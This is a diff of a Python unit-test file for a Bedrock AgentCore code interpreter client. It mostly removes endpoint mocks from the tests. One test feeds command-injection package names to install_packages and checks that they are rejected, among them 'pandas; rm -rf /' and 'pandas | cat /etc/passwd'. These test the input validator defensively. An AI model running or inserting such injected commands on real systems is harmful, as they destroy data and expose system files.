@@ -8,18 +8,14 @@ from bedrock_agentcore.tools.code_interpreter_client import CodeInterpreter, cod
 
 
 class TestCodeInterpreterClient:
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_init(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_init(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_control_client = MagicMock()
         mock_data_client = MagicMock()
         mock_session.client.side_effect = [mock_control_client, mock_data_client]
         mock_boto3.Session.return_value = mock_session
-        mock_get_control_endpoint.return_value = "https://mock-control-endpoint.com"
-        mock_get_data_endpoint.return_value = "https://mock-data-endpoint.com"
         region = "us-west-2"
 
         # Act
@@ -29,13 +25,11 @@ class TestCodeInterpreterClient:
         mock_session.client.assert_any_call(
             "bedrock-agentcore-control",
             region_name=region,
-            endpoint_url="https://mock-control-endpoint.com",
             config=ANY,
         )
         mock_session.client.assert_any_call(
             "bedrock-agentcore",
             region_name=region,
-            endpoint_url="https://mock-data-endpoint.com",
             config=ANY,
         )
         assert client.control_plane_client == mock_control_client
@@ -43,18 +37,14 @@ class TestCodeInterpreterClient:
         assert client.identifier is None
         assert client.session_id is None
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_init_with_integration_source(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_init_with_integration_source(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_control_client = MagicMock()
         mock_data_client = MagicMock()
         mock_session.client.side_effect = [mock_control_client, mock_data_client]
         mock_boto3.Session.return_value = mock_session
-        mock_get_control_endpoint.return_value = "https://mock-control-endpoint.com"
-        mock_get_data_endpoint.return_value = "https://mock-data-endpoint.com"
         region = "us-west-2"
         integration_source = "strands"
 
@@ -65,16 +55,12 @@ class TestCodeInterpreterClient:
         assert client.integration_source == integration_source
         assert mock_session.client.call_count == 2
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
-    def test_init_with_custom_session(self, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_init_with_custom_session(self):
         # Arrange
         mock_session = MagicMock()
         mock_control_client = MagicMock()
         mock_data_client = MagicMock()
         mock_session.client.side_effect = [mock_control_client, mock_data_client]
-        mock_get_control_endpoint.return_value = "https://mock-control-endpoint.com"
-        mock_get_data_endpoint.return_value = "https://mock-data-endpoint.com"
         region = "us-west-2"
 
         # Act
@@ -87,10 +73,8 @@ class TestCodeInterpreterClient:
         assert client.identifier is None
         assert client.session_id is None
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_property_getters_setters(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_property_getters_setters(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -108,10 +92,8 @@ class TestCodeInterpreterClient:
         client.session_id = test_session_id
         assert client.session_id == test_session_id
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_create_code_interpreter_minimal(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_create_code_interpreter_minimal(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_control_client = MagicMock()
@@ -142,12 +124,8 @@ class TestCodeInterpreterClient:
         )
         assert result == mock_response
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_create_code_interpreter_with_all_options(
-        self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint
-    ):
+    def test_create_code_interpreter_with_all_options(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_control_client = MagicMock()
@@ -191,10 +169,8 @@ class TestCodeInterpreterClient:
         )
         assert result == mock_response
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_delete_code_interpreter(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_delete_code_interpreter(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -215,12 +191,8 @@ class TestCodeInterpreterClient:
         client.control_plane_client.delete_code_interpreter.assert_called_once_with(codeInterpreterId="test-interp-123")
         assert result == mock_response
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_delete_code_interpreter_with_client_token(
-        self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint
-    ):
+    def test_delete_code_interpreter_with_client_token(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -243,10 +215,8 @@ class TestCodeInterpreterClient:
         )
         assert result == mock_response
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_get_code_interpreter(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_get_code_interpreter(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -268,10 +238,8 @@ class TestCodeInterpreterClient:
         client.control_plane_client.get_code_interpreter.assert_called_once_with(codeInterpreterId="test-interp-123")
         assert result == mock_response
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_list_code_interpreters_default(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_list_code_interpreters_default(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -293,10 +261,8 @@ class TestCodeInterpreterClient:
         client.control_plane_client.list_code_interpreters.assert_called_once_with(maxResults=10)
         assert result == mock_response
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_list_code_interpreters_with_filters(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_list_code_interpreters_with_filters(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -318,11 +284,9 @@ class TestCodeInterpreterClient:
         )
         assert result == mock_response
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
     @patch("bedrock_agentcore.tools.code_interpreter_client.uuid.uuid4")
-    def test_start_with_defaults(self, mock_uuid4, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_start_with_defaults(self, mock_uuid4, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_data_client = MagicMock()
@@ -347,10 +311,8 @@ class TestCodeInterpreterClient:
         assert client.identifier == "aws.codeinterpreter.v1"
         assert client.session_id == "session-123"
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_start_with_custom_params(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_start_with_custom_params(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_data_client = MagicMock()
@@ -378,10 +340,8 @@ class TestCodeInterpreterClient:
         assert client.identifier == "custom.interpreter"
         assert client.session_id == "custom-session-123"
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_stop_when_session_exists(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_stop_when_session_exists(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_data_client = MagicMock()
@@ -402,10 +362,8 @@ class TestCodeInterpreterClient:
         assert client.identifier is None
         assert client.session_id is None
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_stop_when_no_session(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_stop_when_no_session(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_data_client = MagicMock()
@@ -423,10 +381,8 @@ class TestCodeInterpreterClient:
         client.data_plane_client.stop_code_interpreter_session.assert_not_called()
         assert result is True
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_get_session(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_get_session(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -451,10 +407,8 @@ class TestCodeInterpreterClient:
         )
         assert result == mock_response
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_get_session_with_params(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_get_session_with_params(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -477,10 +431,8 @@ class TestCodeInterpreterClient:
         )
         assert result == mock_response
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_get_session_missing_ids(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_get_session_missing_ids(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -491,10 +443,8 @@ class TestCodeInterpreterClient:
         with pytest.raises(ValueError, match="Interpreter ID and Session ID must be provided"):
             client.get_session()
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_list_sessions(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_list_sessions(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -519,10 +469,8 @@ class TestCodeInterpreterClient:
         )
         assert result == mock_response
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_list_sessions_with_filters(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_list_sessions_with_filters(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -552,10 +500,8 @@ class TestCodeInterpreterClient:
         )
         assert result == mock_response
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_list_sessions_missing_interpreter_id(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_list_sessions_missing_interpreter_id(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -566,13 +512,9 @@ class TestCodeInterpreterClient:
         with pytest.raises(ValueError, match="Interpreter ID must be provided"):
             client.list_sessions()
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
     @patch("bedrock_agentcore.tools.code_interpreter_client.uuid.uuid4")
-    def test_invoke_with_existing_session(
-        self, mock_uuid4, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint
-    ):
+    def test_invoke_with_existing_session(self, mock_uuid4, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_data_client = MagicMock()
@@ -599,10 +541,8 @@ class TestCodeInterpreterClient:
         )
         assert result == mock_response
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_invoke_with_no_session(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_invoke_with_no_session(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_data_client = MagicMock()
@@ -678,10 +618,8 @@ class TestCodeInterpreterClient:
         mock_client.start.assert_called_once_with(identifier="custom-interpreter-123")
         mock_client.stop.assert_called_once()
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_upload_file_text_content(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_upload_file_text_content(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -705,10 +643,8 @@ class TestCodeInterpreterClient:
         )
         assert result == mock_response
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_upload_file_binary_content(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_upload_file_binary_content(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -735,10 +671,8 @@ class TestCodeInterpreterClient:
         )
         assert result == mock_response
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_upload_file_nested_path(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_upload_file_nested_path(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -761,10 +695,8 @@ class TestCodeInterpreterClient:
             arguments={"content": [{"path": "scripts/analysis.py", "text": "print('hello')"}]},
         )
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_upload_file_absolute_path_error(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_upload_file_absolute_path_error(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -777,10 +709,8 @@ class TestCodeInterpreterClient:
         with pytest.raises(ValueError, match="Path must be relative, not absolute"):
             client.upload_file(path="/absolute/path/file.txt", content="test")
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_upload_files_multiple(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_upload_files_multiple(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -814,10 +744,8 @@ class TestCodeInterpreterClient:
         )
         assert result == mock_response
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_upload_files_mixed_content(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_upload_files_mixed_content(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -853,10 +781,8 @@ class TestCodeInterpreterClient:
             },
         )
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_upload_files_absolute_path_error(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_upload_files_absolute_path_error(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -874,10 +800,8 @@ class TestCodeInterpreterClient:
         with pytest.raises(ValueError, match="Path must be relative, not absolute"):
             client.upload_files(files)
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_install_packages_basic(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_install_packages_basic(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -901,10 +825,8 @@ class TestCodeInterpreterClient:
         )
         assert result == mock_response
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_install_packages_with_versions(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_install_packages_with_versions(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -927,10 +849,8 @@ class TestCodeInterpreterClient:
             arguments={"command": "pip install pandas>=2.0 numpy<2.0 scikit-learn==1.3.0"},
         )
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_install_packages_with_upgrade(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_install_packages_with_upgrade(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -953,10 +873,8 @@ class TestCodeInterpreterClient:
             arguments={"command": "pip install --upgrade pandas"},
         )
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_install_packages_empty_list_error(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_install_packages_empty_list_error(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -969,12 +887,8 @@ class TestCodeInterpreterClient:
         with pytest.raises(ValueError, match="At least one package name must be provided"):
             client.install_packages([])
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_install_packages_invalid_characters_error(
-        self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint
-    ):
+    def test_install_packages_invalid_characters_error(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -984,29 +898,27 @@ class TestCodeInterpreterClient:
         client.session_id = "test-session-id"
 
         # Act & Assert - semicolon
-        with pytest.raises(ValueError, match="Invalid characters in package name"):
+        with pytest.raises(ValueError, match="Invalid package name"):
             client.install_packages(["pandas; rm -rf /"])
 
         # Act & Assert - pipe
-        with pytest.raises(ValueError, match="Invalid characters in package name"):
+        with pytest.raises(ValueError, match="Invalid package name"):
             client.install_packages(["pandas | cat /etc/passwd"])
 
         # Act & Assert - ampersand
-        with pytest.raises(ValueError, match="Invalid characters in package name"):
+        with pytest.raises(ValueError, match="Invalid package name"):
             client.install_packages(["pandas && malicious"])
 
         # Act & Assert - backtick
-        with pytest.raises(ValueError, match="Invalid characters in package name"):
+        with pytest.raises(ValueError, match="Invalid package name"):
             client.install_packages(["pandas`whoami`"])
 
         # Act & Assert - dollar sign
-        with pytest.raises(ValueError, match="Invalid characters in package name"):
+        with pytest.raises(ValueError, match="Invalid package name"):
             client.install_packages(["pandas$HOME"])
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_download_file_text(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_download_file_text(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -1040,10 +952,8 @@ class TestCodeInterpreterClient:
         )
         assert result == "col1,col2\n1,2\n3,4"
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_download_file_binary(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_download_file_binary(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -1075,10 +985,8 @@ class TestCodeInterpreterClient:
         assert result == binary_content
         assert isinstance(result, bytes)
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_download_file_blob_utf8_returns_str(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_download_file_blob_utf8_returns_str(self, mock_boto3):
         """Blob content that is valid UTF-8 should be decoded and returned as str."""
         # Arrange
         mock_session = MagicMock()
@@ -1111,10 +1019,8 @@ class TestCodeInterpreterClient:
         assert result == text_content
         assert isinstance(result, str)
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_download_file_not_found(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_download_file_not_found(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -1130,10 +1036,8 @@ class TestCodeInterpreterClient:
         with pytest.raises(FileNotFoundError, match="Could not read file"):
             client.download_file("nonexistent.txt")
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_download_files_multiple(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_download_files_multiple(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -1168,10 +1072,8 @@ class TestCodeInterpreterClient:
         )
         assert result == {"data.csv": "col1,col2\n1,2", "config.json": '{"key": "value"}'}
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_download_files_empty_result(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_download_files_empty_result(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -1189,10 +1091,8 @@ class TestCodeInterpreterClient:
         # Assert
         assert result == {}
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_download_files_binary(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_download_files_binary(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -1238,10 +1138,8 @@ class TestCodeInterpreterClient:
         assert result["/opt/amazon/genesis1p-tools/var/chart.png"] == binary_content
         assert isinstance(result["/opt/amazon/genesis1p-tools/var/chart.png"], bytes)
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_download_files_blob_utf8_returns_str(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_download_files_blob_utf8_returns_str(self, mock_boto3):
         """Blob content that is valid UTF-8 should be decoded and returned as str in multi-file download."""
         # Arrange
         mock_session = MagicMock()
@@ -1291,10 +1189,8 @@ class TestCodeInterpreterClient:
         assert result["/opt/amazon/genesis1p-tools/var/chart.png"] == binary_content
         assert isinstance(result["/opt/amazon/genesis1p-tools/var/chart.png"], bytes)
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_execute_code_python_default(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_execute_code_python_default(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -1320,10 +1216,8 @@ class TestCodeInterpreterClient:
         )
         assert result == mock_response
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_execute_code_javascript(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_execute_code_javascript(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -1348,10 +1242,8 @@ class TestCodeInterpreterClient:
             arguments={"code": code, "language": "javascript", "clearContext": False},
         )
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_execute_code_typescript(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_execute_code_typescript(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -1376,10 +1268,8 @@ class TestCodeInterpreterClient:
             arguments={"code": code, "language": "typescript", "clearContext": False},
         )
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_execute_code_with_clear_context(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_execute_code_with_clear_context(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -1404,10 +1294,8 @@ class TestCodeInterpreterClient:
             arguments={"code": code, "language": "python", "clearContext": True},
         )
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
